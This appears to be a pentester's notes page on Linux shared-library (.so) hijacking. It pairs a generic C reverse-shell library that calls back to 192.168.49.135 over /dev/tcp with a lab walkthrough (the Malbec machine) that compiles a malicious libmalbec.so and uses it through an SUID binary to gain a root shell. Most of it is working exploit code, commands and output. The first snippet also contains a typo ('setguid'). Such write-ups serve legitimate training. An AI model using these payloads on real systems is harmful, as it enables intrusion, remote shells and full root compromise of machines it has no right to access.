# Shared Objects .so Hijacking

So there are going to be times in which there will be a cronjob runnign as root and when we run the said binary it will ask us for a .so file that it is missing, this is our hint to generate one of our own.&#x20;

![](https://miro.medium.com/max/1244/1\*Mw7a4KB-psJTfY3r9q6PoQ.png)

And if we have writeable access to the LD\__LIBRARY_\_PATH it means we can just place our own like I have said before.&#x20;

Here is the code to generate a reverse shell in C.&#x20;

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>


void _init() {

	setgid(0);
	setguid(0);
	system("/bin/bash -i >& /dev/tcp/192.168.49.135/80 0>&1");
	

}
```

All we have to modify is the IP address of our listerner as well as the listening port.&#x20;

![](<../../../.gitbook/assets/image (30).png>)

We compile it like this on the machine or ours.

```
gcc -shared -fPIC -nostartfiles -o pwn pwn.c
```

Change the compiled binary to be named as the .so that is missing.&#x20;

```
mv pwn utils.so
chmod +x utils.so
cp utils.so /hijackable/pah
```

![](<../../../.gitbook/assets/image (33).png>)

### Example 2 (Malbec)



This binary has indeed been granted SUID privileges. Let's execute it and inspect its behavior.

```
carlos@malbec:/home/carlos$ which messenger
which messenger
/usr/bin/messenger
carlos@malbec:/home/carlos$ messenger
messenger
messenger: error while loading shared libraries: libmalbec.so: cannot open shared object file: No such file or directory
```

This error tells us that a dynamic shared library **libmalbec.so** was searched for, but not found. We can confirm this by running `ldd` against the binary.

```
carlos@malbec:/home/carlos$ ldd /usr/bin/messenger
ldd /usr/bin/messenger
        linux-vdso.so.1 (0x00007ffd1b693000)
        libmalbec.so => not found
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f25129de000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f2512bb4000)
```

#### Dynamic Library Hijacking

If we could write to the directory where the library is expected to be, we may be able to hijack the library call and execute arbitrary code. Let's inspect the **/etc/ld.so.conf.d/** directory to determine which shared library configuration files are available.

```
carlos@malbec:/home/carlos$ ls -l /etc/ld.so.conf.d/
ls -l /etc/ld.so.conf.d/
total 20
-rw-r--r-- 1 root root  38 Jun 25  2018 fakeroot-x86_64-linux-gnu.conf
-rw-r--r-- 1 root root 168 May  1  2019 i386-linux-gnu.conf
-rw-r--r-- 1 root root  44 Mar 20  2016 libc.conf
-rw-r--r-- 1 root root  14 Jan 26 04:43 malbec.conf
-rw-r--r-- 1 root root 100 May  1  2019 x86_64-linux-gnu.conf
```

The **malbec.conf** configuration file contains the following:

```
carlos@malbec:/home/carlos$ cat /etc/ld.so.conf.d/malbec.conf
cat /etc/ld.so.conf.d/malbec.conf
/home/carlos/
```

The binary searches **/home/carlos/** for the shared library. This is perfect for our purposes as **/home/carlos/** is the home directory of our user, which means we should have no problem writing our malicious library.

The **/etc/crontab** file indicates that the **/sbin/ldconfig** dynamic linker process runs every two minutes and forces **/usr/bin/messenger** to search for **libmalbec.so** and link it if it is found.

```
carlos@malbec:/home/carlos$ cat /etc/crontab
cat /etc/crontab
...
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/2 * * * * root /sbin/ldconfig
```

Having obtained all this information, we should be able to abuse this functionality. We'll use the following basic root shell C code:

```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}
```

As this is a shared library, we must determine the method the calling method of the **messenger** binary. Before compiling our exploit, let's run `strings` on the binary to help gather clues about the name of our exploit method.

```
carlos@malbec:/home/carlos$ strings /usr/bin/messenger
strings /usr/bin/messenger
/lib64/ld-linux-x86-64.so.2
...
_ITM_deregisterTMCloneTable
__gmon_start__
malbec
__libc_start_main
libmalbec.so
...
_ITM_registerTMCloneTable
malbec
__cxa_finalize@@GLIBC_2.2.5
...
```

The `malbec` string appears a couple of times in the output. Let's give this name a shot. To create our shell source code, we will issue the `cat <<EOT >> rootshell.c` command and then paste the following C code (including the newline character at the end) when presented with the `>` prompt:

```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void malbec() {
setuid(0); setgid(0); system("/bin/bash");
}
```

The process is as follows:

```
carlos@malbec:/home/carlos$ cat <<EOT >> rootshell.c
cat <<EOT >> rootshell.c
> #include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void malbec() {
setuid(0); setgid(0); system("/bin/bash");
}
#include <stdio.h>
> #include <sys/types.h>
> #include <unistd.h>
> void malbec() {
> setuid(0); setgid(0); system("/bin/bash");
> }
> 
```

Inputting `EOT` ends our input sequence and writes our code to the file.

```
> EOT
EOT
carlos@malbec:/home/carlos$ 
carlos@malbec:/home/carlos$ cat rootshell.c                                       
cat rootshell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void malbec() {
setuid(0); setgid(0); system("/bin/bash");
}
```

Compiling the source code now produces the following error:

```
carlos@malbec:/home/carlos$ gcc rootshell.c -o libmalbec.so -shared -Wall -fPIC -w
< rootshell.c -o libmalbec.so -shared -Wall -fPIC -w
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

Let's review our environment variables.

```
carlos@malbec:/home/carlos$ export
export
declare -x LS_COLORS=""
declare -x OLDPWD
declare -x PWD="/home/carlos"
declare -x SHLVL="1"
carlos@malbec:/home/carlos$
```

It seems the `PATH` variable has not been exported. To fix this, we'll `export` this variable.

```
carlos@malbec:/home/carlos$ export PATH
export PATH
carlos@malbec:/home/carlos$ export
export
declare -x LS_COLORS=""
declare -x OLDPWD
declare -x PATH="/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:."
declare -x PWD="/home/carlos"
declare -x SHLVL="1"
carlos@malbec:/home/carlos$
```

Let's try to compile again.

```
carlos@malbec:/home/carlos$ gcc rootshell.c -o libmalbec.so -shared -Wall -fPIC -w
< rootshell.c -o libmalbec.so -shared -Wall -fPIC -w
carlos@malbec:/home/carlos$ ls -l libmalbec.so
ls -l libmalbec.so
-rwxr-xr-x 1 carlos carlos 16088 Jan 27 11:38 libmalbec.so
```

The compiler runs without further issues. Good. Remembering that **ldconfig** runs on a crontab schedule, we will wait two minutes for our library to be found. Then, we can test for successful linking of our malicious library with `ldd`.

```
carlos@malbec:/home/carlos$ ldd /usr/bin/messenger
ldd /usr/bin/messenger
        linux-vdso.so.1 (0x00007ffd752d6000)
        libmalbec.so => /home/carlos/libmalbec.so (0x00007f498cc00000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f498ca3f000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f498cc1a000)
```

Excellent. The process picked up our library. If we run the **messenger** binary, we should drop into a root shell:

```
carlos@malbec:/home/carlos$ id
id
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos)
carlos@malbec:/home/carlos$ messenger
messenger
root@malbec:/home/carlos# id
id
uid=0(root) gid=0(root) groups=0(root),1000(carlos)
```
